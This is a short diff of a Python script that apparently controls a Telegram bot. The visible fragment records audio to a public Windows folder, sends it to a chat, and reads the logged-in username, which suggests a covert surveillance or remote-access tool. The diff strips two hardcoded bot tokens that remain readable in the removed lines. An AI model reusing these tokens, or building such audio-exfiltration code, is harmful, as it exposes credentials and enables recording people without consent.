@@ -49,7 +49,6 @@ import wavio as wv
 from multiprocessing import Process
 
 
-#6619437777:AAGAmak2lcgXlaJc1KniqJrpT2sjlSwXpIg
 
 def send_audio(bot, chat_id):
     with open(r"C:\Users\Public\recorded.wav", "rb") as f:
@@ -76,7 +75,7 @@ auto = ''
 
 # API
 ##########################################################
-bot = telebot.TeleBot('6038725147:AAH0MLqKaSgJdgXPhQvhDLSdLd0XW2PSD5M')
+bot = telebot.TeleBot('YOUR_TOKEN')
 ##########################################################
 
 username = os.getlogin()
